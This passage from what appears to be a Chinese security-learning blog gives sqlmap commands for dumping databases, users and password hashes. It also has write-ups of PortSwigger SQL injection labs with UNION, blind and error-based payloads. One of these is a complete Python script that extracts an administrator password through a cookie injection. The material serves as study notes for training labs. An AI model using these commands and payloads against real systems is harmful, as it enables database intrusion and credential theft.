<p><code>--proxy=&quot;127.0.0.1:8080&quot;</code> 指定代理</p>
<p><code>--threads 10</code> 设置线程数，最高10</p>
<p><code>--risk=1</code> 风险级别（0~3，默认1，常用1），级别提高会增加数据被篡改的风险。</p>
<p><code>--level 1</code> 执行测试的等级（1-5，默认为1，常用3）</p>
<h2 id="脱库">脱库</h2>
<p>获取所有内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; -a</span><br></pre></td></tr></table></figure>
<p><code>-a</code> 就是 all 的意思，获取所有能获取的内容，会消耗很长时间。</p>
<h3 id="获取数据库">获取数据库</h3>
<p><code>--dbs</code> 获取数据库</p>
<p><strong>1、获取数据库版本</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; -b</span><br></pre></td></tr></table></figure>
<p><strong>2、获取当前使用的数据库</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; --current-db</span><br></pre></td></tr></table></figure>
<p><strong>3、获取所有数据库</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --dbs</span><br></pre></td></tr></table></figure>
<h3 id="获取表">获取表</h3>
<p><code>--tables</code> 获取表</p>
<p><strong>1、获取表，可以指定数据库</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<p><strong>2、同时获取多个库的表名，库名用逗号分隔。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security,sys&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<p><strong>3、不指定数据库，默认获取每个数据库中所有的表。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<h3 id="获取字段">获取字段</h3>
<p><code>--columns</code> 参数用来获取字段。</p>
<p><strong>1、获取字段，可以指定库和表</strong></p>
<p>提示：只指定库名但不指定表名会报错。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --columns</span><br></pre></td></tr></table></figure>
<p><strong>2、不指定表名，默认获取当前数据库中所有表的字段。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --columns</span><br></pre></td></tr></table></figure>
<h3 id="获取字段类型">获取字段类型</h3>
<p><code>--schema</code> 获取字段类型，可以指定库或指定表。不指定则获取数据库中每个表所有字段的类型。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --schema</span><br></pre></td></tr></table></figure>
<h3 id="获取值（数据）">获取值（数据）</h3>
<p><code>--dump</code> 获取值，也就是表中的数据。可以指定具体的库、表、字段。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> -C <span class="string">&#x27;username,password&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
<p>获取指定库中所有表的数据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
<p>默认获取表中的所有数据，可以使用 <code>--start</code> <code>--stop</code> 指定开始和结束的行，只获取一部分数据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --start 1 --stop 5  --dump</span><br></pre></td></tr></table></figure>
<h3 id="获取用户">获取用户</h3>
<p><strong>1、获取当前登录数据库的用户</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.31.180/sqli-labs-master/Less-1/?id=1&#x27; --current-user</span><br></pre></td></tr></table></figure>
<p><strong>2、获取所有用户</strong></p>
<p><code>--users</code> 获取数据库的所有用户名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
<p><strong>3、获取用户密码</strong></p>
<p><code>--passwords</code> 获取所有数据库用户的密码（哈希值）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --passwords</span><br></pre></td></tr></table></figure>
<p>数据库不存储明文密码，只会将密码加密后，存储密码的哈希值，所以这里只能查出来哈希值；当然，你也可以借助工具把它们解析成明文。最后面显示数据库用户名对应的密码的哈希值。</p>
<p><strong>6.4、获取用户权限</strong></p>
<p><code>--privileges</code> 查看每个数据库用户都有哪些权限。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --privileges</span><br></pre></td></tr></table></figure>
<p><strong>6.5、判断当前用户是不是管理员</strong></p>
<p><code>--is-dba</code> 判断当前登录的用户是不是数据库的管理员账号。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --is-dba</span><br></pre></td></tr></table></figure>
<p>如果是管理员，就在最后面显示 true。</p>
<h3 id="获取主机名">获取主机名</h3>
<p><code>--hostname</code> 获取服务器主机名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --hostname</span><br></pre></td></tr></table></figure>
<h3 id="搜索库、表、字段。">搜索库、表、字段。</h3>
<p><code>--search</code> 搜索数据库中是否存在指定库/表/字段，需要指定库名/表名/字段名。</p>
<p>搜索数据库中有没有 security 这个数据库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --search</span><br></pre></td></tr></table></figure>
<p>需要手动选择模糊匹配（1）还是完全匹配（2），而后返回匹配的结果。</p>
<p><img src="/posts/23b5c41a//image-20250316163205508.png" alt="image-20250316163205508"></p>
<p>也可以搜索表</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xxx/?id=1&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --search</span><br></pre></td></tr></table></figure>
<p>或者搜索字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -C <span class="string">&#x27;username&#x27;</span> --search</span><br></pre></td></tr></table></figure>
<h3 id="正在执行的SQL语句">正在执行的SQL语句</h3>
<p><code>--statements</code> 获取数据库中正在执行的SQL语句。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --statements </span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
<p><a href="https://blog.csdn.net/wangyuxiang946/article/details/131236510">SQLmap使用教程图文教程（超详细）</a></p>
]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>【PortSwigger靶场】SQL injection</title>
    <url>/posts/3b7c6011/</url>
    <content><![CDATA[<h2 id="SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
<p>这个是查看隐藏数据的漏洞，比较简单。通过BurpSuite直接拦截修改就行。</p>
<p><img src="/posts/3b7c6011//image-20250305143611182.png" alt="image-20250305143611182"></p>
<p>之所以能隐藏信息是因为后端的查询语句是</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>因此通过我们的修改注释掉了<code>AND released = 1</code></p>
<p><strong>思考</strong>：</p>
<p>首先对后端查询语句要有一定敏感程度，另外如果AND后的语句在前是否就避免了这个漏洞呢？</p>
<h2 id="SQL-injection-vulnerability-allowing-login-bypass">SQL injection vulnerability allowing login bypass</h2>
<p>这个也非常简单，注释掉password就可以登录任意用户了。</p>
<p><img src="/posts/3b7c6011//image-20250305144942049.png" alt="image-20250305144942049"></p>
<p><strong>思考</strong>：</p>
<p>对之前挖的几个平台做了一下尝试，没出意外都失败了。果然这么简单的洞不太好遇见。</p>
<h2 id="SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query">SQL injection UNION attack, determining the number of columns returned by the query</h2>
<p>这个使用<code>?category=Accessones' order by 3--</code>时不报错，使用<code>?category=Accessones' order by 4--</code>时报错，说明返回列有三个。但是不能直接过关，需要使用<code>'?category=Accessones'UNION SELECT NULL,NULL,NULL--</code>过关</p>
<p><img src="/posts/3b7c6011//image-20250305153505747.png" alt="image-20250305153505747"></p>
<p>我们可以看到，虽然执行<code>order by 4</code>的时候报错，但是报错代码为500说明还是执行了的。在portswigger中提到：</p>
<blockquote>
<p>​            As with the <code>ORDER BY</code> technique, the application might actually return the database error in its HTTP response, but may  return a generic error or simply return no results. When the number of  nulls matches the number of columns, the database returns an additional  row in the result set, containing null values in each column. The effect on the HTTP response depends on the application’s code. If you are  lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a <code>NullPointerException</code>. In the  worst case, the response might look the same as a response caused by an  incorrect number of nulls. This would make this method ineffective.</p>
</blockquote>
<p>因此报错语句可以作为是否存在UNION漏洞的参考</p>
<p>在 Oracle 中，每个 SELECT 查询都必须使用 FROM 关键字，并指定一个有效的表。Oracle 上有一个名为 dual 的内置表，可用于此目的。因此，在 Oracle 上注入的查询必须如下所示：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT NULL FROM DUAL--</span></span><br></pre></td></tr></table></figure>
<p>MySQL 中，<code>--</code>后必须跟一个空格。</p>
<p>有关数据库特定语法的更多详情，请参阅 <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>。</p>
<h2 id="SQL-injection-UNION-attack-finding-a-column-containing-text">SQL injection UNION attack, finding a column containing text</h2>
<p>让找哪个列支持查找字符串，找出一共多少列以后，挨个试试就可以了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+&#x27;</span>abcdef<span class="string">&#x27;,NULL,NULL--</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; union select null,&#x27;</span>Y5LIpq<span class="string">&#x27;,null--+</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string">?category=Accessories%&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="string">&#x27;Y5LIpq&#x27;</span>,<span class="keyword">null</span><span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; and 1=2 union select null,&#x27;</span>Y5LIpq<span class="string">&#x27;,null--+</span></span><br></pre></td></tr></table></figure>
<h2 id="SQL-injection-UNION-attack-retrieving-data-from-other-tables">SQL injection UNION attack, retrieving data from other tables</h2>
<p>让检索出管理员账号密码，然后登陆管理员的账号。这道题的重点是当遇到两个能检索出字符串的列时，如何利用。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username, password FROM users--</span></span><br></pre></td></tr></table></figure>
<h2 id="SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column">SQL injection UNION attack, retrieving multiple values in a single column</h2>
<p>当只有一个string列可以被检索时，需要将两个列的内容连接到一个列。</p>
<p>这一题稍微有了一点点难度：</p>
<ol>
<li class="lvl-3">
<p>首先通过之前的办法看看有几个可以检索的列</p>
</li>
<li class="lvl-3">
<p>然后检测哪一个列可以检索字符串</p>
</li>
<li class="lvl-3">
<p>最后合并检索用户名和密码</p>
</li>
</ol>
<p>通过检测，可以检索的列有两个，第二个可以检索字符串。将用户名和密码合并到第二列中即可，注入代码：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union+select+null,username||&#x27;</span><span class="operator">~</span><span class="operator">~</span><span class="operator">~</span><span class="string">&#x27;||password+from+users--</span></span><br></pre></td></tr></table></figure>
<p>不同的数据库使用不同的语法来执行字符串连接。有关详细信息，请参阅<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>。</p>
<p>然而在实际情况下，我们并不能像题目所给出的那样直接获得表名和列名。因此，现实中，我们需要首先获得数据库的表名和列名，才能对其进行查询。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; union select null,table_name from information_schema.tables--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">列：username,password</span></span><br><span class="line"><span class="string">?category=Gifts&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">数据:administrator<span class="operator">=</span><span class="operator">=</span><span class="operator">=</span>lcv555mv2prf2m81w40v</span><br><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; union select null,concat(username,&#x27;</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="string">&#x27;,password) from users--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">利用administrator登录</span></span><br></pre></td></tr></table></figure>
<h2 id="SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft">SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>
<p>获得数据库的版本号，比较简单。各个数据库查询数据库版本的语句如下：</p>
<table>
<thead>
<tr>
<th>Database type</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td>Microsoft, MySQL</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td>Oracle</td>
<td><code>SELECT * FROM v$version</code></td>
</tr>
<tr>
<td>PostgreSQL</td>
<td><code>SELECT version()</code></td>
</tr>
</tbody>
</table>
<p>查询SQL版本的语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union+select+null,@@version-- +</span></span><br></pre></td></tr></table></figure>
<p>思考：</p>
<p>发现了一个问题，在执行SQL注入时，使用<code>--</code>进行注释时需要在其后添加一个空格，即<code>-- +</code>。然而刚开始并没有加但是还是过了，因此需要注意。另外这一题是可以使用<code>#</code>来注释的，但是前面的却不行，原因目前还不明白。</p>
<h2 id="SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases">SQL injection attack, listing the database contents on non-Oracle databases</h2>
<p>这一题题目没有给表单和列名，更切合实际情况，实际上跟上面的是一致的。不再过多叙述。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union select &#x27;</span>a<span class="string">&#x27;,null-- =</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="keyword">null</span> <span class="keyword">from</span> information_schema.tables<span class="comment">-- =</span></span><br><span class="line"><span class="string">&#x27;union select column_name,null from information_schema.columns where table_name=&#x27;</span>users_vorbge<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> username_ucmiyr<span class="operator">||</span><span class="string">&#x27;~~~&#x27;</span><span class="operator">||</span>password_unmsjv,<span class="keyword">null</span> <span class="keyword">from</span> users_vorbge<span class="comment">-- =</span></span><br></pre></td></tr></table></figure>
<h2 id="Blind-SQL-injection-with-conditional-responses">Blind SQL injection with conditional responses</h2>
<p>这道题吧，我个人感觉算是一道很不错的题了，对目前的我来讲已经算是很有难度了。但是同时，我也发现如果我不能缜密的去思考现实情况里会遇到的问题，靶场给我带来的收获也是有限的。因此我也决定打完SQL注入的靶场以后，先找一些SQL注入漏洞的案例复现一下，感受一下真是的场景。</p>
<p>在开始这道题之前呢，有必要了解一下，要解决这道题是有三个必要条件的：</p>
<ol>
<li class="lvl-3">
<p><strong>正确和错误的cookie的返回包存在差异</strong></p>
</li>
</ol>
<p>起初我是很困惑我要多么小心翼翼才能发现<code>Welcome back!</code>这一句话的小小差异。然后我就恍然大悟了，我们直接对比response包的大小，如果不一样再找出哪儿不一样就可以了。</p>
<ol start="2">
<li class="lvl-3">
<p><strong>cookie允许盲注</strong></p>
</li>
</ol>
<p>即在cookie后添加<code>'AND '1'='1</code>和添加<code>'AND '1'='2</code>返回的结果是不同的</p>
<ol start="3">
<li class="lvl-3">
<p><strong>我们要查询的表名和列名</strong></p>
</li>
</ol>
<p>虽然题目直接给了我们表名和列名，当我们都知道，实际情况中并不会有公司摆着洞给我们挖。因此有没有办法通过盲注获得我们需要的表名和列名呢？那当然是有的。</p>
<p>我们要知道，盲注语句是否执行成功我们是可以知道的。那么，是否存在一个表单或者列名，我们也是可以了解的。因此，我们依然可以通过盲注的方式获得表名和列名。</p>
<p>所以是可以使用Python写脚本爆破的，当然也可以用sqlmap工具，非常简便。</p>
<p><font class="notice">我打算再写一篇sqlmap的用法总结，先这里插个眼</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.首先进行sql漏洞扫描</span><br><span class="line">sqlmap -u url --cookie <span class="string">&quot;TrackingId=xxx&quot;</span></span><br><span class="line">2.然后获得当前使用的数据库名称</span><br><span class="line">sqlmap -u url --current-db</span><br><span class="line">3.获得所有表</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;数据库名&quot;</span> --tables</span><br><span class="line">4.获得<span class="built_in">users</span>表字段</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;数据库名&quot;</span> -T <span class="string">&quot;users&quot;</span> --dump</span><br><span class="line">5.获得<span class="built_in">users</span>表中的用户名</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;数据库名&quot;</span> -T <span class="string">&quot;users&quot;</span> -C <span class="string">&quot;username&quot;</span> --dump</span><br></pre></td></tr></table></figure>
<p>在获得某用户密码的时候，本题只需要我们获得<code>administrator</code>的密码就可以了，考虑到密码又多又长，逐个爆破会消耗大量的时间，因此我编写了Python脚本单独对<code>administrator</code>用户进行爆破，脚本已经很自动化了，只需要把url和TrackingId换成子自己的就可以了。脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求的URL</span></span><br><span class="line">url = <span class="string">&quot;https://0a00000a04a6557481de208a005400a1.web-security-academy.net/filter?category=Pets&quot;</span></span><br><span class="line">username = <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">tablename = <span class="string">&#x27;users&#x27;</span></span><br><span class="line">method = <span class="string">&#x27;get&#x27;</span></span><br><span class="line">sleep_time = <span class="number">0</span></span><br><span class="line">TrackingId = <span class="string">&#x27;brVO8ubeFsIHT9hw&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cookie获取密码长度get_password_length_by_user</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_length_by_user</span>(<span class="params">url,username,tablename,intject_id</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;intject_id&#125;</span>&#x27; and (select &#x27;a&#x27; from users where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27; AND LENGTH(password)&gt;<span class="subst">&#123;i&#125;</span>)=&#x27;a&#x27; --+&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">        sleep(sleep_time)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password_length=i</span><br><span class="line">            <span class="keyword">return</span> password_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破某一用户名密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_by_user</span>(<span class="params">url,username,tablename,inject_id</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    password_length=get_password_length_by_user(url,username,tablename,inject_id)</span><br><span class="line">    <span class="keyword">for</span> password_index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, password_length+<span class="number">1</span>):</span><br><span class="line">        ascii_low = <span class="number">32</span></span><br><span class="line">        ascii_high = <span class="number">128</span></span><br><span class="line">        ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> ascii_low &lt; ascii_high:</span><br><span class="line">            cookies = &#123;</span><br><span class="line">                <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;inject_id&#125;</span>&#x27; and ascii(substr((select password from <span class="subst">&#123;tablename&#125;</span> where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27;),<span class="subst">&#123;password_index&#125;</span>,1)) &gt; <span class="subst">&#123;ascii_mid&#125;</span>--+;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">            sleep(sleep_time)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                ascii_low=ascii_mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ascii_high = ascii_mid</span><br><span class="line">            ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        result+=<span class="built_in">chr</span>(ascii_mid)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">password=get_password_by_user( url,username,tablename,TrackingId)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>
<p><font class="notice">其实，本题在爆破数据表时，也可以使用Python单独对表名中含有<code>user</code>的表进行爆破，但考虑实际情况，把所有的表名爆破出，容易获得更多的信息</font></p>
<h2 id="Blind-SQL-injection-with-conditional-errors">Blind SQL injection with conditional errors</h2>
<p>跟上一题是非常类似的。讲一下原理</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、添加单引号收到错误</span><br><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2、添加两个单引号错误消失</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;&#x27;</span></span><br><span class="line"><span class="string">3、确认是查询错误而不是其他类型错误。下列语句表明目标为Oracle 数据库</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;（错误）</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> dual)<span class="operator">||</span><span class="string">&#x27;（正确）</span></span><br><span class="line"><span class="string">4、验证users表存在</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> ROWNUM <span class="operator">=</span> <span class="number">1</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">5、验证用户administrator存在</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">6、爆破密码长度</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> LENGTH(password)<span class="operator">&gt;</span>§a§ <span class="keyword">THEN</span> to_char(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">7、爆破密码</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> SUBSTR(password,§b§,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;§a§&#x27;</span> <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<p><img src="/posts/3b7c6011//image-20250316173050195.png" alt="image-20250316173050195"></p>
<h2 id="Visible-error-based-SQL-injection">Visible error-based SQL injection</h2>
<p>错误会返回到客户端</p>
<p><img src="/posts/3b7c6011//image-20250316181656140.png" alt="image-20250316181656140"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、天加一个引号，可以在web页面看到报错，并看到自己的cookie</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2、添加注释符不再报错</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="number">3</span>、添加错误的语句观察返回内容</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27; AND CAST((SELECT 1) AS int)--</span></span><br><span class="line"><span class="string">4、使用正确语句错误消失</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br><span class="line"><span class="number">5</span>、泄露用户</span><br><span class="line">TrackingId<span class="operator">=</span>xxxx<span class="string">&#x27; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</span></span><br><span class="line"><span class="string">6、泄露密码</span></span><br><span class="line"><span class="string">TrackingId=&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p>我试了下面这个注入语句，但是没有得到想要的结果。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="string">&#x27; AND 1=CAST((SELECT password FROM users where username=&#x27;</span>administrator<span class="string">&#x27;) AS int)--</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/3b7c6011//image-20250316184013533.png" alt="image-20250316184013533"></p>
<h2 id="Blind-SQL-injection-with-time-delays-and-information-retrieval">Blind SQL injection with time delays and information retrieval</h2>
